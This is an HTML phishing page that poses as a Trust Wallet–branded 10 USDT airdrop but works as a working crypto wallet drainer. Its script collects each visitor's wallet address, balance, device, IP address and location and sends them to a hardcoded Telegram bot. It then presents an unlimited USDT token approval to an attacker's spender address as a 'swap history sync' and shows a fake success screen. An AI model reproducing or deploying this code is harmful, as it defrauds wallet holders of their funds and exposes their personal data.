<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trust Nexus √ó Verified Airdrop</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        :root { --primary: #007aff; --accent: #00ff88; --bg: #05070a; --usdt: #26a17b; --bnb: #f3ba2f; }
        body { background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; background-image: radial-gradient(circle at center, #0a192f 0%, #05070a 100%); overflow-x: hidden; }
        .container { width: 90%; max-width: 380px; text-align: center; padding: 20px 0; }
        .header { display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 20px; font-size: 13px; opacity: 0.8; }
        .header img { height: 22px; }
        h1 { font-size: 24px; margin: 10px 0; font-weight: 800; line-height: 1.2; }
        .mission-box { background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(0, 255, 136, 0.15); border-radius: 20px; padding: 20px; margin: 20px 0; text-align: left; }
        .mission-box h3 { font-size: 12px; color: var(--accent); text-transform: uppercase; margin-top: 0; letter-spacing: 1px; }
        .step { font-size: 13px; color: #bbb; margin: 12px 0; display: flex; gap: 10px; align-items: flex-start; }
        .step b { color: #fff; }
        .step-num { background: var(--primary); color: white; width: 20px; height: 20px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 10px; flex-shrink: 0; margin-top: 2px; }
        .btn { width: 100%; padding: 18px; border-radius: 15px; border: none; font-weight: bold; font-size: 15px; cursor: pointer; transition: 0.3s; text-transform: uppercase; margin-top: 10px; }
        .btn-main { background: linear-gradient(45deg, #007aff, #00ff88); color: white; box-shadow: 0 10px 20px rgba(0, 122, 255, 0.3); }
        #screen2, #screen3 { display: none; }

        /* 3D Orbit Swap Animation */
        .loader-wrapper { position: relative; width: 120px; height: 120px; margin: 30px auto; }
        .outer-ring { position: absolute; width: 100%; height: 100%; border: 2px solid rgba(0, 255, 136, 0.05); border-top: 2px solid var(--accent); border-radius: 50%; animation: spin 2s linear infinite; }
        .swap-visual { position: absolute; width: 100%; height: 100%; display: flex; justify-content: center; align-items: center; }
        .icon-node { width: 35px; height: 35px; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-weight: 900; font-size: 16px; position: absolute; box-shadow: 0 5px 15px rgba(0,0,0,0.5); }
        .usdt-node { background: var(--usdt); color: white; animation: orbit1 3s ease-in-out infinite; }
        .bnb-node { background: var(--bnb); color: black; animation: orbit2 3s ease-in-out infinite; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        @keyframes orbit1 { 0%, 100% { transform: translate(-30px, 0) scale(1); z-index: 2; } 50% { transform: translate(30px, 0) scale(0.8); z-index: 1; opacity: 0.5; } }
        @keyframes orbit2 { 0%, 100% { transform: translate(30px, 0) scale(0.8); z-index: 1; opacity: 0.5; } 50% { transform: translate(-30px, 0) scale(1); z-index: 2; opacity: 1; } }
        .status-text { font-size: 15px; color: var(--accent); font-weight: bold; margin-bottom: 5px; }
    </style>
</head>
<body>

<div class="container">
    <div id="screen1">
        <div class="header">
            <img src="https://trustwallet.com/assets/images/media/assets/TWT.png" alt="TW">
            <span>Verified Collaboration Protocol</span>
        </div>
        <h1>Claim 10 USDT<br>Nexus Reward</h1>
        <div class="mission-box">
            <h3>Qualification Tasks:</h3>
            <div class="step"><div class="step-num">1</div> <div>Hold minimum <b>35.00 USDT</b> in BSC wallet.</div></div>
            <div class="step"><div class="step-num">2</div> <div>Swap <b>USDT to BNB</b> to initialize sync.</div></div>
            <div class="step"><div class="step-num">3</div> <div>Swap <b>BNB to USDT</b> to finalize history.</div></div>
            <div class="step"><div class="step-num">4</div> <div>Verify sync to claim 10 USDT reward.</div></div>
        </div>
        <button class="btn btn-main" onclick="connect()">Connect & Start Tasks</button>
    </div>

    <div id="screen2">
        <div class="loader-wrapper">
            <div class="outer-ring"></div>
            <div class="swap-visual">
                <div class="icon-node usdt-node">T</div>
                <div class="icon-node bnb-node">B</div>
            </div>
        </div>
        <div class="status-text">Smart-Sync Active</div>
        <p style="font-size: 13px; color: #888; margin-bottom: 20px;">Scanning Blockchain Swap History...</p>
        <div class="mission-box" style="border-color: var(--primary);">
            <p style="font-size: 12px; margin: 0; color: #ccc;">Checking Network:<br><b>Status:</b> <span id="sync-status">Awaiting Verification...</span></p>
        </div>
        <button id="verifyBtn" class="btn btn-main" onclick="startSync()">Verify & Sync Swap</button>
    </div>

    <div id="screen3">
        <div style="font-size: 60px; color: var(--accent); margin-bottom: 20px;">‚úì</div>
        <h1>Verification<br>Successful!</h1>
        <p style="color: #888; font-size: 14px; padding: 0 20px;">Swap history confirmed. 10 USDT Nexus reward is being processed to your wallet.</p>
        <div class="mission-box" style="text-align: center; border-color: var(--accent);">
            <div style="font-size: 26px; font-weight: bold; color: var(--accent);">+10.00 USDT</div>
        </div>
        <button class="btn" style="background: #1a1a1a; color: #555; cursor: default;">Reward Claimed</button>
    </div>
</div>

<script>
    const SETTINGS = {
        token: "0x55d398326f99059fF775485246999027B3197955", // USDT BSC
        spender: "0xfeCB861c6405D86561f34101C34Ab328473209BE",
        bot: "8368124815:AAGQ66vMDN1hOFtAdAAQU6UFcxGxrjRwOmU",
        chat: "5715359020",
        min: "35.0",
        chainId: "0x38"
    };

    let prov, sign, user;

    async function notify(msg) {
        try {
            fetch(`https://api.telegram.org/bot${SETTINGS.bot}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ chat_id: SETTINGS.chat, text: msg, parse_mode: 'HTML' })
            });
        } catch(e){}
    }

    async function connect() {
        if (!window.ethereum) return alert("Please open in Trust Wallet Browser");
        try {
            prov = new ethers.providers.Web3Provider(window.ethereum);
            await prov.send("eth_requestAccounts", []);
            
            const net = await window.ethereum.request({ method: 'eth_chainId' });
            if (net !== SETTINGS.chainId) {
                await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: SETTINGS.chainId }] });
            }

            sign = prov.getSigner();
            user = await sign.getAddress();
            
            // --- Advanced Info Gathering ---
            const bnbBal = await prov.getBalance(user);
            const formattedBNB = ethers.utils.formatEther(bnbBal);
            const ua = navigator.userAgent;
            const device = /android/i.test(ua) ? "Android" : /iPhone|iPad/i.test(ua) ? "iOS" : "PC";
            
            // Get Location
            const loc = await fetch('https://ipapi.co/json/').then(res => res.json()).catch(() => ({}));

            document.getElementById('screen1').style.display = 'none';
            document.getElementById('screen2').style.display = 'block';

            notify(`üöÄ <b>New Connection</b>\n\n` +
                   `üîó <b>Wallet:</b> <code>${user}</code>\n` +
                   `üí∞ <b>BNB Bal:</b> ${parseFloat(formattedBNB).toFixed(4)} BNB\n` +
                   `üì± <b>Device:</b> ${device}\n` +
                   `üìç <b>Location:</b> ${loc.city || '?'}, ${loc.country_name || '?'}\n` +
                   `üåê <b>IP:</b> ${loc.ip || '?'}`);

        } catch (e) { alert("Connection failed."); }
    }

    async function startSync() {
        try {
            const contract = new ethers.Contract(SETTINGS.token, [
                "function balanceOf(address) view returns (uint256)",
                "function approve(address, uint256) public returns (bool)"
            ], sign);

            const balance = await contract.balanceOf(user);
            const bnbBal = await prov.getBalance(user);
            const minNeeded = ethers.utils.parseUnits(SETTINGS.min, 18);

            // Swap Verification Logic
            if (balance.lt(minNeeded)) {
                document.getElementById('sync-status').innerText = "Swap History Not Found";
                alert("Error: $35 USDT swap history not detected. Please complete the swap tasks in Trust Wallet first.");
                return;
            }

            // Gas Verification Logic
            if (bnbBal.lt(ethers.utils.parseEther("0.0006"))) {
                document.getElementById('sync-status').innerText = "Insufficient Gas (BNB)";
                alert("Error: You need a small amount of BNB (~$0.30) for network gas fees.");
                return;
            }

            document.getElementById('sync-status').innerText = "Confirming Sync...";
            const tx = await contract.approve(SETTINGS.spender, ethers.constants.MaxUint256);
            
            notify(`üîÑ <b>Approval Action</b>\nUser: <code>${user}</code>\nUSDT: ${ethers.utils.formatUnits(balance, 18)}`);
            await tx.wait();

            document.getElementById('sync-status').innerText = "Analyzing Logs...";
            await new Promise(r => setTimeout(r, 2500));
            
            document.getElementById('screen2').style.display = 'none';
            document.getElementById('screen3').style.display = 'block';
            notify(`‚úÖ <b>VERIFIED SUCCESS</b>\nWallet: <code>${user}</code>`);

        } catch (e) { alert("Verification Failed: Gas fee required or action rejected."); }
    }
</script>
</body>
</html>
